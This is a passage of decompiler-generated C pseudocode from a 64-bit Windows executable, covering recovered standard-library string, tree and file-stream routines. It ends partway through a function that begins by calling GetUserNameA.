      *result = v2;
    *(_QWORD *)(v2 + 16) = a2;
    a2[1] = v2;
  }
  return result;
}

//----- (000000014000C8B0) ----------------------------------------------------
void __fastcall sub_14000C8B0(__int64 a1)
{
  FILE *v1; // rcx

  v1 = *(FILE **)(a1 + 144);
  if ( v1 )
    unlock_file(v1);
}

//----- (000000014000C8D0) ----------------------------------------------------
_QWORD *__fastcall sub_14000C8D0(_QWORD *a1, unsigned __int64 a2, char a3)
{
  char v3; // bp
  size_t v4; // r8
  size_t v5; // rsi
  _QWORD *v6; // rbx
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rax
  __int64 v9; // rcx
  _QWORD *v10; // rax
  bool v11; // cf
  _QWORD *v12; // rax

  v3 = a3;
  v4 = a1[2];
  v5 = a2;
  v6 = a1;
  if ( -1i64 - v4 <= a2 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( a2 )
  {
    v7 = v4 + a2;
    if ( v4 + a2 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v8 = a1[3];
    if ( v8 >= v7 )
    {
      if ( !v7 )
      {
        a1[2] = 0i64;
        if ( v8 < 0x10 )
          *(_BYTE *)a1 = 0;
        else
          *(_BYTE *)*a1 = 0;
        return v6;
      }
    }
    else
    {
      sub_140004790(a1, v7, v4);
      if ( !v7 )
        return v6;
    }
    v9 = v6[2];
    if ( v5 == 1 )
    {
      if ( v6[3] < 0x10ui64 )
        *((_BYTE *)v6 + v9) = v3;
      else
        *(_BYTE *)(*v6 + v9) = v3;
    }
    else
    {
      if ( v6[3] < 0x10ui64 )
        v10 = v6;
      else
        v10 = (_QWORD *)*v6;
      memset((char *)v10 + v9, v3, v5);
    }
    v11 = v6[3] < 0x10ui64;
    v6[2] = v7;
    if ( v11 )
      v12 = v6;
    else
      v12 = (_QWORD *)*v6;
    *((_BYTE *)v12 + v7) = 0;
  }
  return v6;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014000C9E0) ----------------------------------------------------
__int64 __fastcall sub_14000C9E0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rsi

  v1 = a1;
  if ( *(_QWORD *)(a1 + 144) )
  {
    v2 = a1;
    if ( !sub_14000C4F0(a1) )
      v2 = 0i64;
    if ( fclose(*(FILE **)(v1 + 144)) )
      v2 = 0i64;
  }
  else
  {
    v2 = 0i64;
  }
  *(_BYTE *)(v1 + 136) = 0;
  *(_BYTE *)(v1 + 129) = 0;
  std::basic_streambuf<char,std::char_traits<char>>::_Init(v1);
  *(_QWORD *)(v1 + 144) = 0i64;
  *(_DWORD *)(v1 + 132) = dword_1400D9BA0;
  *(_QWORD *)(v1 + 120) = 0i64;
  return v2;
}
// 1400A1698: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD);
// 1400D9BA0: using guessed type int dword_1400D9BA0;

//----- (000000014000CA70) ----------------------------------------------------
__int64 *__fastcall sub_14000CA70(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 *v5; // rdx
  __int64 **v6; // rbx
  __int64 *v7; // rax
  __int64 v8; // rcx
  __int64 *result; // rax
  __int64 v10; // rax
  __int64 v11; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v14; // [rsp+30h] [rbp+8h]
  __int64 v15; // [rsp+40h] [rbp+18h]
  __int64 v16; // [rsp+48h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v4 = a2;
  v5 = *a1;
  v6 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != v5 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v10 = a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v11 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v11 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v15 = i;
              a3 = i;
            }
            v15 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v11; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v11 = j;
            v15 = v11;
          }
        }
        sub_14000CB70(v6, (__int64 *)&v14, v10);
        a3 = v15;
      }
      while ( v15 != v16 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_14000C720((__int64)a1, (__int64 *)v5[1]);
    (*v6)[1] = (__int64)*v6;
    **v6 = (__int64)*v6;
    (*v6)[2] = (__int64)*v6;
    v7 = *v6;
    v6[1] = 0i64;
    v8 = *v7;
    result = v4;
    *v4 = v8;
  }
  return result;
}

//----- (000000014000CB70) ----------------------------------------------------
__int64 *__fastcall sub_14000CB70(_QWORD *a1, __int64 *a2, __int64 a3)
{
  __int64 *v3; // r15
  __int64 *v4; // rsi
  _QWORD *v5; // r14
  __int64 v6; // rax
  __int64 j; // rax
  __int64 i; // rax
  __int64 v9; // rdi
  __int64 v10; // rbx
  __int64 k; // rcx
  __int64 v12; // rax
  _QWORD *v13; // rdx
  __int64 v14; // rax
  __int64 l; // rcx
  __int64 *v16; // rax
  char v17; // cl
  _BYTE *v18; // rcx
  __int64 *v19; // rcx
  __int64 **v20; // rax
  _BYTE *v21; // rcx
  __int64 v22; // rax
  _QWORD *v23; // rax
  __int64 v24; // rax
  __int64 v26; // [rsp+50h] [rbp+18h]

  v26 = a3;
  v3 = a2;
  v4 = (__int64 *)a3;
  v5 = a1;
  if ( !*(_BYTE *)(a3 + 25) )
  {
    v6 = *(_QWORD *)(a3 + 16);
    if ( *(_BYTE *)(v6 + 25) )
    {
      for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( a3 != *(_QWORD *)(i + 16) )
          break;
        a3 = i;
      }
      a3 = i;
      v26 = i;
    }
    else
    {
      a3 = *(_QWORD *)(a3 + 16);
      for ( j = *(_QWORD *)v6; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
        a3 = j;
      v26 = a3;
    }
  }
  if ( *(_BYTE *)(*v4 + 25) )
  {
    v9 = v4[2];
LABEL_15:
    v10 = v4[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    if ( *(__int64 **)(*a1 + 8i64) == v4 )
    {
      *(_QWORD *)(*a1 + 8i64) = v9;
    }
    else if ( *(__int64 **)v10 == v4 )
    {
      *(_QWORD *)v10 = v9;
    }
    else
    {
      *(_QWORD *)(v10 + 16) = v9;
    }
    if ( *(__int64 **)*a1 == v4 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        k = v10;
      }
      else
      {
        v12 = *(_QWORD *)v9;
        for ( k = v9; !*(_BYTE *)(v12 + 25); v12 = *(_QWORD *)v12 )
          k = v12;
      }
      *(_QWORD *)*v5 = k;
    }
    v13 = (_QWORD *)*v5;
    if ( *(__int64 **)(*v5 + 16i64) == v4 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        v13[2] = v10;
      }
      else
      {
        v14 = *(_QWORD *)(v9 + 16);
        for ( l = v9; !*(_BYTE *)(v14 + 25); v14 = *(_QWORD *)(v14 + 16) )
          l = v14;
        v13[2] = l;
      }
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v4[2] + 25) )
  {
    v9 = *v4;
    goto LABEL_15;
  }
  v9 = *(_QWORD *)(a3 + 16);
  if ( (__int64 *)a3 == v4 )
    goto LABEL_15;
  *(_QWORD *)(*v4 + 8) = a3;
  *(_QWORD *)a3 = *v4;
  if ( a3 == v4[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = *(_QWORD *)(a3 + 8);
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    *(_QWORD *)v10 = v9;
    *(_QWORD *)(a3 + 16) = v4[2];
    *(_QWORD *)(v4[2] + 8) = a3;
  }
  if ( *(__int64 **)(*a1 + 8i64) == v4 )
  {
    *(_QWORD *)(*a1 + 8i64) = a3;
  }
  else
  {
    v16 = (__int64 *)v4[1];
    if ( (__int64 *)*v16 == v4 )
      *v16 = a3;
    else
      v16[2] = a3;
  }
  *(_QWORD *)(a3 + 8) = v4[1];
  v17 = *(_BYTE *)(a3 + 24);
  *(_BYTE *)(a3 + 24) = *((_BYTE *)v4 + 24);
  *((_BYTE *)v4 + 24) = v17;
LABEL_45:
  if ( *((_BYTE *)v4 + 24) == 1 )
  {
    for ( ; v9 != *(_QWORD *)(*v5 + 8i64); v10 = *(_QWORD *)(v10 + 8) )
    {
      if ( *(_BYTE *)(v9 + 24) != 1 )
        break;
      v18 = *(_BYTE **)v10;
      if ( v9 == *(_QWORD *)v10 )
      {
        v18 = *(_BYTE **)(v10 + 16);
        if ( !v18[24] )
        {
          v18[24] = 1;
          v19 = *(__int64 **)(v10 + 16);
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)(v10 + 16) = *v19;
          if ( !*(_BYTE *)(*v19 + 25) )
            *(_QWORD *)(*v19 + 8) = v10;
          v19[1] = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v19;
          }
          else
          {
            v20 = *(__int64 ***)(v10 + 8);
            if ( (__int64 *)v10 == *v20 )
              *v20 = v19;
            else
              v20[2] = v19;
          }
          *v19 = v10;
          *(_QWORD *)(v10 + 8) = v19;
          v18 = *(_BYTE **)(v10 + 16);
        }
        if ( v18[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) == 1 )
          {
            *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
            v18[24] = 0;
            sub_14000C800((__int64)v5, v18);
            v18 = *(_BYTE **)(v10 + 16);
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
          sub_14001BF70((__int64)v5, v10);
          break;
        }
      }
      else
      {
        if ( !v18[24] )
        {
          v18[24] = 1;
          v21 = *(_BYTE **)v10;
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)v10 = *((_QWORD *)v21 + 2);
          v22 = *((_QWORD *)v21 + 2);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *((_QWORD *)v21 + 1) = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v21;
          }
          else
          {
            v23 = *(_QWORD **)(v10 + 8);
            if ( v10 == v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *((_QWORD *)v21 + 2) = v10;
          *(_QWORD *)(v10 + 8) = v21;
          v18 = *(_BYTE **)v10;
        }
        if ( v18[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) == 1 )
          {
            *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
            v18[24] = 0;
            sub_14001BF70((__int64)v5, (__int64)v18);
            v18 = *(_BYTE **)v10;
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
          sub_14000C800((__int64)v5, (_QWORD *)v10);
          break;
        }
      }
      v18[24] = 0;
LABEL_77:
      v9 = v10;
    }
    *(_BYTE *)(v9 + 24) = 1;
  }
  if ( (unsigned __int64)v4[7] >= 0x10 )
    operator delete((void *)v4[4]);
  v4[7] = 15i64;
  v4[6] = 0i64;
  *((_BYTE *)v4 + 32) = 0;
  operator delete(v4);
  v24 = v5[1];
  if ( v24 )
    v5[1] = v24 - 1;
  *v3 = v26;
  return v3;
}

//----- (000000014000CF60) ----------------------------------------------------
char __fastcall sub_14000CF60(__int64 a1, __int64 *a2)
{
  __int64 v2; // rbx
  std::codecvt_base *v3; // rax
  std::codecvt_base *v4; // rdi
  char result; // al

  v2 = a1;
  v3 = (std::codecvt_base *)sub_14000BA60(a2);
  v4 = v3;
  result = std::codecvt_base::always_noconv(v3);
  if ( result )
  {
    *(_QWORD *)(v2 + 120) = 0i64;
  }
  else
  {
    *(_QWORD *)(v2 + 120) = v4;
    result = std::basic_streambuf<char,std::char_traits<char>>::_Init(v2);
  }
  return result;
}
// 1400A1698: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD);
// 1400A16E8: using guessed type bool std::codecvt_base::always_noconv(std::codecvt_base *__hidden this);

//----- (000000014000CFB0) ----------------------------------------------------
__int64 __fastcall sub_14000CFB0(__int64 a1, const char *a2, int a3, int a4)
{
  __int64 v4; // rbx
  struct _iobuf *v5; // rdi
  __int64 *v6; // rax
  std::codecvt_base *v7; // rdi
  void (__fastcall ***v8)(_QWORD, signed __int64); // rax
  __int64 v10; // [rsp+40h] [rbp+8h]

  v4 = a1;
  if ( *(_QWORD *)(a1 + 144) )
    return 0i64;
  v5 = std::_Fiopen(a2, a3, a4);
  if ( !v5 )
    return 0i64;
  *(_BYTE *)(v4 + 136) = 1;
  *(_BYTE *)(v4 + 129) = 0;
  std::basic_streambuf<char,std::char_traits<char>>::_Init(v4);
  *(_QWORD *)(v4 + 24) = (char *)v5 + 16;
  *(_QWORD *)(v4 + 32) = (char *)v5 + 16;
  *(_QWORD *)(v4 + 56) = v5;
  *(_QWORD *)(v4 + 64) = v5;
  *(_QWORD *)(v4 + 80) = (char *)v5 + 8;
  *(_QWORD *)(v4 + 88) = (char *)v5 + 8;
  *(_QWORD *)(v4 + 144) = v5;
  *(_DWORD *)(v4 + 132) = dword_1400D9BA0;
  *(_QWORD *)(v4 + 120) = 0i64;
  v6 = (__int64 *)std::basic_streambuf<char,std::char_traits<char>>::getloc(v4, &v10);
  v7 = (std::codecvt_base *)sub_14000BA60(v6);
  if ( std::codecvt_base::always_noconv(v7) )
  {
    *(_QWORD *)(v4 + 120) = 0i64;
  }
  else
  {
    *(_QWORD *)(v4 + 120) = v7;
    std::basic_streambuf<char,std::char_traits<char>>::_Init(v4);
  }
  if ( v10 )
  {
    v8 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (__cdecl **)(__int64))(*(_QWORD *)v10 + 16i64))(v10);
    if ( v8 )
      (**v8)(v8, 1i64);
  }
  return v4;
}
// 1400A1670: using guessed type struct _iobuf *__stdcall std::_Fiopen(const char *, _DWORD, _DWORD);
// 1400A1698: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD);
// 1400A16A8: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::getloc(_QWORD, _QWORD);
// 1400A16E8: using guessed type bool std::codecvt_base::always_noconv(std::codecvt_base *__hidden this);
// 1400D9BA0: using guessed type int dword_1400D9BA0;

//----- (000000014000D3C0) ----------------------------------------------------
signed __int64 __fastcall sub_14000D3C0(__int64 a1, unsigned int a2)
{
  __int64 v2; // rdi
  unsigned int v3; // ebx
  unsigned __int64 v4; // rcx
  signed __int64 result; // rax
  FILE *v6; // rdx

  v2 = a1;
  v3 = a2;
  v4 = **(_QWORD **)(a1 + 56);
  if ( !v4 || **(_QWORD **)(v2 + 24) >= v4 || a2 != -1 && *(unsigned __int8 *)(v4 - 1) != a2 )
  {
    v6 = *(FILE **)(v2 + 144);
    if ( v6 && v3 != -1 )
    {
      if ( !*(_QWORD *)(v2 + 120) && ungetc((unsigned __int8)v3, v6) != -1 )
        return v3;
      if ( **(_QWORD **)(v2 + 56) != v2 + 128 )
      {
        *(_BYTE *)(v2 + 128) = v3;
        std::basic_filebuf<char,std::char_traits<char>>::_Set_back(v2);
        return v3;
      }
    }
    return 0xFFFFFFFFi64;
  }
  ++**(_DWORD **)(v2 + 80);
  --**(_QWORD **)(v2 + 56);
  result = 0i64;
  if ( a2 != -1 )
    result = a2;
  return result;
}
// 14000C860: using guessed type __int64 __fastcall std::basic_filebuf<char,std::char_traits<char>>::_Set_back(_QWORD);

//----- (000000014000D470) ----------------------------------------------------
__int64 __fastcall sub_14000D470(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  signed __int64 v4; // r14
  int v5; // ebp
  __int64 v6; // rsi
  __int64 v7; // rdi
  __int64 v8; // rbx
  _QWORD *v9; // rax
  __int64 v10; // rcx
  __int64 v11; // rdx
  int v12; // eax
  fpos_t Pos; // [rsp+40h] [rbp+8h]

  v4 = a1 + 128;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( **(_QWORD **)(a1 + 56) == a1 + 128 && a4 == 1 && !*(_QWORD *)(a1 + 120) )
    v6 = a3 - 1;
  if ( !*(_QWORD *)(a1 + 144)
    || !sub_14000C4F0(a1)
    || (v6 || v5 != 1) && fseeki64(*(FILE **)(v8 + 144), v6, v5)
    || fgetpos(*(FILE **)(v8 + 144), &Pos) )
  {
    v12 = 0;
    *(_QWORD *)v7 = std::_BADOFF;
    *(_QWORD *)(v7 + 8) = 0i64;
  }
  else
  {
    v9 = *(_QWORD **)(v8 + 24);
    if ( *v9 == v4 )
    {
      v10 = *(_QWORD *)(v8 + 104);
      v11 = *(_QWORD *)(v8 + 112);
      *v9 = v10;
      **(_QWORD **)(v8 + 56) = v10;
      **(_DWORD **)(v8 + 80) = v11 - v10;
    }
    *(_QWORD *)v7 = 0i64;
    *(_QWORD *)(v7 + 8) = Pos;
    v12 = *(_DWORD *)(v8 + 132);
  }
  *(_DWORD *)(v7 + 16) = v12;
  return v7;
}
// 1400A1650: using guessed type const __int64 std::_BADOFF;

//----- (000000014000D560) ----------------------------------------------------
__int64 __fastcall sub_14000D560(__int64 a1, __int64 a2, __int64 *a3)
{
  bool v3; // zf
  __int64 v4; // rsi
  __int64 *v5; // r14
  __int64 v6; // rbx
  __int64 v7; // rdi
  int v8; // eax
  fpos_t Pos; // [rsp+30h] [rbp+8h]

  v3 = *(_QWORD *)(a1 + 144) == 0i64;
  v4 = *a3;
  Pos = a3[1];
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( v3
    || !sub_14000C4F0(a1)
    || fsetpos(*(FILE **)(v7 + 144), &Pos)
    || v4 && fseeki64(*(FILE **)(v7 + 144), v4, 1)
    || fgetpos(*(FILE **)(v7 + 144), &Pos) )
  {
    v8 = 0;
    *(_QWORD *)v6 = std::_BADOFF;
    *(_QWORD *)(v6 + 8) = 0i64;
  }
  else
  {
    *(_DWORD *)(v7 + 132) = *((_DWORD *)v5 + 4);
    std::basic_filebuf<char,std::char_traits<char>>::_Reset_back(v7);
    *(_QWORD *)v6 = 0i64;
    *(_QWORD *)(v6 + 8) = Pos;
    v8 = *(_DWORD *)(v7 + 132);
  }
  *(_DWORD *)(v6 + 16) = v8;
  return v6;
}
// 14000C7D0: using guessed type __int64 __fastcall std::basic_filebuf<char,std::char_traits<char>>::_Reset_back(_QWORD);
// 1400A1650: using guessed type const __int64 std::_BADOFF;

//----- (000000014000D640) ----------------------------------------------------
__int64 __fastcall sub_14000D640(__int64 a1, char *a2, size_t a3)
{
  __int64 v3; // rbx
  FILE *v4; // rcx
  size_t v5; // r9
  int v6; // er8
  __int64 v7; // rdi

  v3 = a1;
  v4 = *(FILE **)(a1 + 144);
  v5 = a3;
  if ( !v4 )
    return 0i64;
  v6 = a2 || a3 ? 0 : 4;
  if ( setvbuf(v4, a2, v6, v5) )
    return 0i64;
  v7 = *(_QWORD *)(v3 + 144);
  *(_BYTE *)(v3 + 136) = 1;
  *(_BYTE *)(v3 + 129) = 0;
  std::basic_streambuf<char,std::char_traits<char>>::_Init(v3);
  if ( v7 )
  {
    *(_QWORD *)(v3 + 56) = v7;
    *(_QWORD *)(v3 + 64) = v7;
    *(_QWORD *)(v3 + 24) = v7 + 16;
    *(_QWORD *)(v3 + 32) = v7 + 16;
    *(_QWORD *)(v3 + 80) = v7 + 8;
    *(_QWORD *)(v3 + 88) = v7 + 8;
  }
  *(_QWORD *)(v3 + 144) = v7;
  *(_DWORD *)(v3 + 132) = dword_1400D9BA0;
  *(_QWORD *)(v3 + 120) = 0i64;
  return v3;
}
// 1400A1698: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD);
// 1400D9BA0: using guessed type int dword_1400D9BA0;

//----- (000000014000D700) ----------------------------------------------------
signed __int64 __fastcall sub_14000D700(_QWORD *a1)
{
  _QWORD *v1; // rbx
  signed __int64 result; // rax

  v1 = a1;
  if ( a1[18]
    && (*(unsigned int (__fastcall **)(_QWORD *, signed __int64))(*a1 + 24i64))(a1, 0xFFFFFFFFi64) != -1
    && fflush((FILE *)v1[18]) < 0 )
  {
    result = 0xFFFFFFFFi64;
  }
  else
  {
    result = 0i64;
  }
  return result;
}

//----- (000000014000D750) ----------------------------------------------------
signed __int64 __fastcall sub_14000D750(__int64 a1)
{
  __int64 v1; // rdi
  unsigned __int64 v2; // rcx
  signed int *v3; // rdx
  __int64 v4; // r8
  _QWORD *v5; // rcx
  unsigned __int8 *v6; // rdx
  int v8; // eax
  unsigned int v9; // esi
  int v10; // eax
  char v11; // r14
  size_t v12; // rdx
  unsigned __int64 v13; // rbx
  unsigned __int64 v14; // r9
  _BYTE *v15; // rax
  _BYTE *v16; // rax
  _BYTE *v17; // rax
  char *v18; // rcx
  void *v19; // r8
  signed int v20; // eax
  void **v21; // rcx
  _BYTE *v22; // rax
  const void *v23; // r8
  __int64 *v24; // rdx
  int v25; // eax
  __int64 v26; // rbx
  __int64 *Dst; // [rsp+28h] [rbp-9h]
  char *v28; // [rsp+30h] [rbp-1h]
  __int64 *v29; // [rsp+38h] [rbp+7h]
  __int64 v30; // [rsp+40h] [rbp+Fh]
  void *Src; // [rsp+48h] [rbp+17h]
  size_t v32; // [rsp+58h] [rbp+27h]
  unsigned __int64 v33; // [rsp+60h] [rbp+2Fh]

  v30 = -2i64;
  v1 = a1;
  v2 = **(_QWORD **)(a1 + 56);
  if ( v2 )
  {
    v3 = *(signed int **)(v1 + 80);
    v4 = *v3;
    if ( v2 < v2 + v4 )
    {
      *v3 = v4 - 1;
      v5 = *(_QWORD **)(v1 + 56);
      v6 = (unsigned __int8 *)(*v5)++;
      return *v6;
    }
  }
  if ( !*(_QWORD *)(v1 + 144) )
    return -1i64;
  if ( **(_QWORD **)(v1 + 24) == v1 + 128 )
    std::basic_streambuf<char,std::char_traits<char>>::setg(
      v1,
      *(_QWORD *)(v1 + 104),
      *(_QWORD *)(v1 + 104),
      *(_QWORD *)(v1 + 112));
  if ( !*(_QWORD *)(v1 + 120) )
  {
    v8 = fgetc(*(FILE **)(v1 + 144));
    if ( v8 == -1 )
      v9 = -1;
    else
      v9 = (unsigned __int8)v8;
    return v9;
  }
  v33 = 15i64;
  v32 = 0i64;
  LOBYTE(Src) = 0;
  v10 = fgetc(*(FILE **)(v1 + 144));
  v9 = -1;
  while ( 1 )
  {
    v11 = v10;
    if ( v10 == -1 )
      goto LABEL_53;
    v12 = v32;
    if ( -1i64 - v32 <= 1 )
      goto LABEL_52;
    v13 = v32 + 1;
    if ( v32 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      break;
    v14 = v33;
    if ( v33 < v13 )
    {
      sub_140004790(&Src, v32 + 1, v32);
      goto LABEL_22;
    }
    if ( v32 == -1i64 )
    {
      v32 = 0i64;
      v15 = &Src;
      if ( v33 >= 0x10 )
        v15 = Src;
      *v15 = 0;
LABEL_22:
      v12 = v32;
      v14 = v33;
      if ( !v13 )
        goto LABEL_28;
    }
    v16 = &Src;
    if ( v14 >= 0x10 )
      v16 = Src;
    v16[v12] = v11;
    v32 = v13;
    v17 = &Src;
    if ( v33 >= 0x10 )
      v17 = Src;
    v17[v13] = 0;
    v14 = v33;
    v12 = v32;
LABEL_28:
    v18 = (char *)&Src;
    if ( v14 >= 0x10 )
      v18 = (char *)Src;
    v19 = &Src;
    if ( v14 >= 0x10 )
      v19 = Src;
    v29 = (__int64 *)&v29;
    v28 = (char *)&Dst + 1;
    Dst = (__int64 *)&Dst;
    v20 = std::codecvt<char,char,int>::in(*(_QWORD *)(v1 + 120), v1 + 132, v19, &v18[v12], &v28);
    if ( v20 < 0 )
      goto LABEL_53;
    if ( v20 <= 1 )
    {
      v21 = &Src;
      if ( v29 != (__int64 *)&Dst )
      {
        if ( v33 >= 0x10 )
          LODWORD(v21) = (_DWORD)Src;
        v24 = (__int64 *)v28;
        v25 = (_DWORD)v21 + v32 - (_DWORD)v28;
        v26 = v25;
        if ( v25 > 0 )
        {
          while ( 1 )
          {
            ungetc(*((char *)v24 + --v26), *(FILE **)(v1 + 144));
            if ( v26 <= 0 )
              break;
            v24 = (__int64 *)v28;
          }
        }
        goto LABEL_45;
      }
      v22 = &Src;
      if ( v33 >= 0x10 )
        v22 = Src;
      sub_140005230(&Src, 0i64, v28 - v22);
    }
    else
    {
      if ( v20 != 3 )
        goto LABEL_53;
      if ( v32 >= 1 )
      {
        v23 = &Src;
        if ( v33 >= 0x10 )
          v23 = Src;
        memcpy_s(&Dst, 1ui64, v23, 1ui64);
LABEL_45:
        v9 = (unsigned __int8)Dst;
        goto LABEL_53;
      }
    }
    v10 = fgetc(*(FILE **)(v1 + 144));
  }
  std::_Xlength_error("string too long");
  __debugbreak();
LABEL_52:
  std::_Xlength_error("string too long");
LABEL_53:
  if ( v33 >= 0x10 )
    operator delete(Src);
  return v9;
}
// 1400A16A0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::setg(_QWORD, _QWORD, _QWORD, _QWORD);
// 1400A16E0: using guessed type __int64 __fastcall std::codecvt<char,char,int>::in(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014000DA50) ----------------------------------------------------
signed __int64 __fastcall sub_14000DA50(__int64 a1)
{
  signed int **v1; // rbx
  unsigned __int8 *v2; // rcx
  unsigned int v4; // edi

  v1 = (signed int **)a1;
  v2 = **(unsigned __int8 ***)(a1 + 56);
  if ( v2 && v2 < &v2[*v1[10]] )
    return *v2;
  v4 = (*((__int64 (__fastcall **)(signed int **))*v1 + 7))(v1);
  if ( v4 == -1 )
    return 0xFFFFFFFFi64;
  (*((void (__fastcall **)(signed int **, _QWORD))*v1 + 4))(v1, v4);
  return v4;
}

//----- (000000014000DAC0) ----------------------------------------------------
_QWORD *__fastcall sub_14000DAC0(_QWORD *a1, void *a2, _BYTE *a3)
{
  _BYTE *v3; // rax
  size_t v4; // r8
  _QWORD *v5; // rbx
  _QWORD *v6; // rax

  v3 = a3;
  v4 = 0i64;
  v5 = a1;
  if ( *v3 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( v3[v4] );
  }
  v6 = sub_140004CA0(a2, v3, v4);
  sub_140003CB0(v5, v6);
  return v5;
}

//----- (000000014000DB10) ----------------------------------------------------
size_t *__fastcall sub_14000DB10(void *Src, _QWORD *a2, _BYTE *a3)
{
  _BYTE *v3; // rsi
  _QWORD *v4; // r14
  size_t *v5; // rdi
  size_t v6; // rbx
  __int64 v7; // rcx
  signed __int64 v8; // rax
  _BYTE *v9; // rax

  v3 = a3;
  v4 = a2;
  v5 = (size_t *)Src;
  v6 = 0i64;
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  v7 = a2[2];
  if ( *a3 )
  {
    v8 = -1i64;
    do
      ++v8;
    while ( a3[v8] );
  }
  else
  {
    v8 = 0i64;
  }
  if ( v5[3] != v8 + v7 && sub_1400049C0(v5, v8 + v7, 1) )
  {
    v5[2] = 0i64;
    if ( v5[3] < 0x10 )
      v9 = v5;
    else
      v9 = (_BYTE *)*v5;
    *v9 = 0;
  }
  sub_140004B80(v5, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( *v3 )
  {
    v6 = -1i64;
    do
      ++v6;
    while ( v3[v6] );
  }
  sub_140004CA0(v5, v3, v6);
  return v5;
}

//----- (000000014000DBF0) ----------------------------------------------------
__int64 __fastcall sub_14000DBF0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  size_t *v4; // rax
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  DWORD pcbBuffer; // [rsp+20h] [rbp-298h]
  __int64 v9; // [rsp+28h] [rbp-290h]
  __int64 v10; // [rsp+30h] [rbp-288h]
  void *v11; // [rsp+38h] [rbp-280h]
  __int64 v12; // [rsp+48h] [rbp-270h]
  unsigned __int64 v13; // [rsp+50h] [rbp-268h]
  void *v14; // [rsp+58h] [rbp-260h]
  __int64 v15; // [rsp+68h] [rbp-250h]
  unsigned __int64 v16; // [rsp+70h] [rbp-248h]
  void *Src; // [rsp+78h] [rbp-240h]
  unsigned __int64 v18; // [rsp+90h] [rbp-228h]
  CHAR Buffer; // [rsp+A0h] [rbp-218h]

  v9 = -2i64;
  v2 = a2;
  v3 = a1;
  v10 = a1;
  *(_QWORD *)(a1 + 24) = 15i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_BYTE *)a1 = 0;
  *(_QWORD *)(a1 + 32) = 0i64;
  memset(&Buffer, 0, 0x200ui64);
  pcbBuffer = 512;
  GetUserNameA(&Buffer, &pcbBuffer);
